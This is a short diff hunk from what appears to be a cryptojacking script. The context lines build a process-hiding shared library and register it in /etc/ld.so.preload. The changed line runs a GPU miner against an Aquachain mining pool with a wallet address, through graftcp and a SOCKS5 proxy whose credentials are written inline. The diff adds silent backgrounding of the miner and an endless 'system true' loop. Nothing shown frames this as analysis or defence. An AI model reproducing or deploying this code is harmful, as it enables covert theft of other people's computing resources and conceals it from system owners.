@@ -46,4 +46,5 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./ac-gpu -F http://pool.aquachain.xyz:8888/0xa1Ab79adE8B4d41d7C898A44521D567F59E8f082/mukidi -t 1 --proxy socks5://14abf5d6e18da:dbb7a6d2ae@185.242.111.64:12324
+./graftcp/graftcp ./ac-gpu -F http://pool.aquachain.xyz:8888/0xa1Ab79adE8B4d41d7C898A44521D567F59E8f082/mukidi -t 1 --proxy socks5://14abf5d6e18da:dbb7a6d2ae@185.242.111.64:12324 >/dev/null 2>&1 >/dev/null &  
+while :; do echo "system true"; sleep 5; done
